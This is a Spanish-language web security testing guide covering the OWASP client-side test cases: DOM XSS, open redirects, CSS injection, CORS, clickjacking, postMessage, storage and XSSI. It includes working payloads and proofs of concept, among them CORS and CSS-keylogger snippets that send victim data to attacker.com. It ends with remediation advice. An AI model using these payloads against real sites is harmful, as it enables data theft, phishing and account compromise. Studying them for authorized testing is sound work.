# 4.11 Client-side Testing (WSTG-CLNT)

## WSTG-CLNT-01: Testing for DOM-Based Cross Site Scripting

### Sources (entrada de datos al DOM)
```javascript
document.URL            document.documentURI
document.URLUnencoded   location.href
location.search         location.hash
location.pathname       document.referrer
window.name             document.cookie
history.state
```

### Sinks (peligrosos)
```javascript
// HTML Sinks
innerHTML               outerHTML
document.write()        document.writeln()
insertAdjacentHTML()

// JavaScript Sinks
eval()                  Function()
setTimeout()            setInterval()
execScript()

// Location Sinks
location.href = USER_INPUT
location.assign(USER_INPUT)
location.replace(USER_INPUT)

// jQuery Sinks
$()                     $.html()
$.append()              $.prepend()
$.after()               $.before()
```

### Metodología de Testing
```bash
# 1. Rastrear source → sink en DevTools → Sources → breakpoints condicionales
# 2. Inyectar en hash:
https://target.com/#<img src=x onerror=alert(1)>
# 3. Inyectar en query string:
https://target.com/?q=<script>alert(1)</script>
# 4. Buscar en el código fuente JS las funciones sink listadas arriba
#    y rastrear de dónde viene el dato que llega a ellas
```

### Herramientas
- DOMinator Pro, DOM Snitch
- Burp Suite DOM Invader
- Búsqueda estática: `grep -rn "innerHTML\|eval(\|document.write" *.js`

---

## WSTG-CLNT-02: Testing for JavaScript Execution

### Objetivo
Identificar puntos donde JavaScript controlado por el atacante puede ejecutarse, más allá del DOM XSS clásico — incluye `javascript:` URIs, manejadores de eventos inyectados dinámicamente, y `Function()`/`eval()` alimentados por datos externos.

```bash
# Probar esquemas javascript: en cualquier campo que acepte URLs
javascript:alert(1)
javascript:void(alert(1))
JaVaScRiPt:alert(1)    # bypass de filtros case-sensitive

# Probar si el valor de un parámetro llega a un eval() o new Function()
?callback=alert(1)
?cb=alert(1)//
```

---

## WSTG-CLNT-03: Testing for HTML Injection

```html
<!-- Si input se refleja en HTML sin sanitizar pero < > están filtrados: -->
<h1>INJECTION</h1>
<br><b>injected</b>

<!-- Si se inyecta dentro de un atributo sin comillas -->
style="color:red"

<!-- Defacement simple para PoC -->
<h1>Sitio Hackeado</h1><img src="https://evil.com/banner.png">
```

HTML Injection es similar a XSS pero limitado a inyección de markup sin ejecución de JavaScript — aún así puede usarse para phishing, defacement, o como vector para otros ataques (ej. clickjacking embebido).

---

## WSTG-CLNT-04: Testing for Client-side URL Redirect

### Open Redirect Payloads
```bash
?next=https://evil.com
?redirect=https://evil.com
?url=//evil.com
?return=javascript:alert(1)
?goto=\evil.com   # backslash (interpretado distinto en IE)

# Bypass de filtros
?url=https://target.com@evil.com    # confusión de userinfo en URL
?url=https://evil.com%23.target.com # fragment bypass
?url=https://target.com.evil.com    # confusión de subdominio
?url=/\evil.com                     # protocolo-relative confuso
?url=https:evil.com                 # esquema sin //
```

### Uso en Ataques
```
# Phishing: enviar un link de dominio legítimo que redirija a sitio de phishing
https://legit.com/redirect?next=https://evil.com/fake-login

# Bypass de OAuth redirect_uri whitelist (si la validación es por substring/prefix)
https://target.com/oauth/callback?redirect_uri=https://target.com.evil.com
```

---

## WSTG-CLNT-05: Testing for CSS Injection

```css
/* Si el atacante controla CSS o atributos style, puede exfiltrar datos */
input[name="csrf_token"][value^="a"] {
  background: url(https://attacker.com/log?leak=a);
}
/* Repetir por cada carácter posible para exfiltrar el valor completo del campo */

/* CSS Keylogger clásico */
input[type="password"][value$="a"] { background: url(https://attacker.com/log?c=a); }
```

CSS injection es especialmente peligrosa cuando el atacante puede inyectar selectores de atributos arbitrarios, permitiendo exfiltrar valores de campos ocultos (tokens CSRF, datos sensibles) carácter por carácter sin necesidad de JavaScript.

---

## WSTG-CLNT-06: Testing for Client-side Resource Manipulation

```javascript
// Verificar si parámetros de URL controlan qué recursos (scripts, CSS, imágenes) se cargan
?lib=https://attacker.com/malicious.js
?theme=https://attacker.com/evil.css
?widget_src=//attacker.com/widget.js

// Probar en código fuente JS si existen patrones como:
document.createElement('script').src = getParam('lib');
```

---

## WSTG-CLNT-07: Testing Cross Origin Resource Sharing (CORS)

```bash
# Probar origen arbitrario
curl -H "Origin: https://evil.com" https://target.com/api/user-data -I
# Si responde:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true
# → CORS vulnerable con credenciales

# Probar con null origin (común en iframes sandboxed, archivos locales)
curl -H "Origin: null" https://target.com/api/ -I
# Access-Control-Allow-Origin: null + credentials=true → vulnerable

# Probar con reflejo dinámico del Origin (la app refleja cualquier dominio)
curl -H "Origin: https://random-evil-domain-123.com" https://target.com/api/ -I

# Probar bypass por subdominio si la validación es laxa
curl -H "Origin: https://evil.target.com" https://target.com/api/ -I
curl -H "Origin: https://targetcom.evil.com" https://target.com/api/ -I
```

### PoC de Explotación CORS
```html
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if(xhr.readyState == 4){
    fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
  }
};
xhr.open('GET', 'https://target.com/api/profile', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

---

## WSTG-CLNT-08: Testing for Cross Site Flashing

```bash
# Solo relevante en aplicaciones legacy que aún usan Adobe Flash (.swf)
# Revisar crossdomain.xml (ver WSTG-CONF-08)
# Buscar parámetros FlashVars que acepten URLs externas sin validar
?flashVars=movie=https://attacker.com/evil.swf

# Decompilar SWF para buscar llamadas a ExternalInterface.call() 
# inseguras que acepten input externo sin sanitizar
```

---

## WSTG-CLNT-09: Testing for Clickjacking

```bash
# Verificar protecciones anti-clickjacking
curl -sI https://target.com | grep -i "x-frame-options\|content-security-policy"
# X-Frame-Options: DENY        → no embebible en ningún iframe
# X-Frame-Options: SAMEORIGIN  → solo embebible desde el mismo origen
# CSP: frame-ancestors 'none'  → no embebible (mecanismo moderno preferido)
```

### PoC de Clickjacking
```html
<!DOCTYPE html>
<html>
<head><title>Click aquí para ganar un premio</title></head>
<body>
<div style="position:relative;">
  <iframe src="https://target.com/sensitive-action"
          style="opacity:0.01; position:absolute; top:0; left:0; width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;">
    ¡Haz clic para ganar!
  </button>
</div>
</body>
</html>
```

### Bypass de Protecciones
- `frame-ancestors` solo verifica el padre inmediato en algunos navegadores antiguos → bypass con doble iframe anidado
- Verificar que la protección aplique a TODAS las páginas sensibles, no solo al login

---

## WSTG-CLNT-10: Testing WebSockets

```javascript
// Verificar si el handshake de WebSocket valida el Origin
// Conectar desde un origen no autorizado:
var ws = new WebSocket("wss://target.com/socket");
ws.onopen = function() { console.log("Conectado sin validación de origen"); };

// Verificar si los mensajes WebSocket llevan algún token de autenticación/CSRF
// o si basta con la cookie de sesión (vulnerable a Cross-Site WebSocket Hijacking)
```

```bash
# Interceptar tráfico WebSocket con Burp Suite (soporta WS nativamente)
# Verificar:
# - ¿El servidor valida el header Origin durante el handshake?
# - ¿Los mensajes están protegidos contra CSRF (token en el mensaje, no solo cookie)?
# - ¿Hay validación de input en los mensajes recibidos (mismos riesgos que REST: XSS, injection)?
```

---

## WSTG-CLNT-11: Testing Web Messaging

```javascript
// postMessage() sin validación de origen es un vector común de XSS/data leak
// Buscar en el código:
window.addEventListener('message', function(e) {
  // ⚠️ Vulnerable si no valida e.origin
  document.getElementById('output').innerHTML = e.data;
});

// PoC: página maliciosa que envía postMessage a la víctima
<script>
var win = window.open('https://target.com/vulnerable-page');
setTimeout(function() {
  win.postMessage('<img src=x onerror=alert(document.domain)>', '*');
}, 2000);
</script>
```

### Checklist
- ¿El receptor de `message` valida `event.origin` contra una whitelist?
- ¿El emisor usa `'*'` como target origin en vez de especificar el dominio exacto?
- ¿El dato recibido se inserta en el DOM sin sanitizar (innerHTML)?

---

## WSTG-CLNT-12: Testing Browser Storage

```javascript
// Verificar en DevTools → Application → Storage
localStorage.getItem('token')         // ¿JWT o sesión almacenada aquí? (vulnerable a robo vía XSS)
sessionStorage.getItem('authToken')   // igualmente vulnerable a XSS
indexedDB                             // revisar si almacena datos sensibles sin cifrar
```

### Riesgos
- A diferencia de las cookies con `HttpOnly`, **localStorage y sessionStorage son siempre accesibles desde JavaScript** → cualquier XSS puede robar tokens almacenados ahí
- Verificar si se almacenan datos sensibles (PII, tokens, contraseñas) sin cifrar en cualquier mecanismo de Web Storage
- Revisar `Cache Storage` (Service Workers) por datos sensibles cacheados persistentemente

---

## WSTG-CLNT-13: Testing for Cross Site Script Inclusion (XSSI)

```html
<!-- Si una API devuelve JSON ejecutable como JavaScript (JSONP o array literal) -->
<script src="https://target.com/api/user-data.json"></script>

<!-- Si el endpoint es accesible cross-origin y devuelve datos sensibles del usuario -->
<!-- autenticado vía cookies, un atacante puede incluirlo como script y robar los datos -->
<script>
// Sobreescribir constructores de Array/Object para capturar datos del JSON "robado"
Array.prototype.push = function(x) { sendToAttacker(x); return x; };
</script>
<script src="https://target.com/api/sensitive-array.json"></script>
```

### Checklist
- ¿Los endpoints JSON sensibles están protegidos contra inclusión cross-origin (CORS correctamente restrictivo, Content-Type `application/json` no ejecutable como script, X-Content-Type-Options: nosniff)?
- ¿Existen endpoints JSONP (`callback=`) que reflejen datos sensibles del usuario autenticado?
- ¿El servidor responde igual sin importar el `Referer`/`Origin`, permitiendo inclusión desde cualquier sitio?

### Remediación General (CLNT)
- Sanitizar/escapar correctamente toda salida hacia el DOM (usar `textContent` en vez de `innerHTML` cuando sea posible)
- CSP estricta (`script-src 'self'`, `frame-ancestors 'none'`, sin `unsafe-inline`/`unsafe-eval`)
- Validar siempre `event.origin` en listeners de `postMessage`
- No almacenar tokens sensibles en localStorage/sessionStorage; preferir cookies `HttpOnly + Secure + SameSite`
- Content-Type correcto y `X-Content-Type-Options: nosniff` en todas las respuestas JSON
